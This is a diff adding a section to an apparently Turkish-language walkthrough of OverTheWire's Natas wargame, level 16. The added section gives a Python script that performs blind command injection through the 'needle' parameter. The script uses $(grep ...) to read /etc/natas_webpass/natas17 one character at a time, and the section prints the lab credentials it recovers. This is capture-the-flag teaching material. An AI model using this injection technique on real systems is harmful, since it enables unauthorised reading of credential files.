@@ -51,4 +51,23 @@ Demek ki parola a harfi ile başlamıyor, yani grep ^a /etc/natas_webpass/natas1
 
 grep -i " " dictionary.txt ifadesinde çift tırnaklar arasına natas17'e ait parola gelicekti ve dictionary.txt dosyasında böyle bir satır olmadığı için çıktı boş olucaktı.
 
+Parolanın 32 karakter uzunluğunda olduğunu bir önceki seviyelerden biliyoruz.Bununla birlikte parola küçük harf, büyük harf ve rakam içeriyor. Manuel bir test yapılamayacağından , otomatize eden bir script yazıyoruz.
 
+{% highlight python %}
+import requests
+from requests.auth import HTTPBasicAuth
+auth=HTTPBasicAuth('natas16','WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')
+chars="abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
+passwd=""
+for i in range(32):
+        for char in chars:
+                s=requests.get('http://natas16.natas.labs.overthewire.org/index.php?needle=hacker$(grep ^'+passwd+char+' /etc/natas_webpass/natas17)',auth=auth)
+                if "hacker" not in s.text:
+                        passwd=passwd+char
+                        print passwd
+                        break
+{% endhighlight %}
+
+>> natas17:8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
+
+#### Level 17
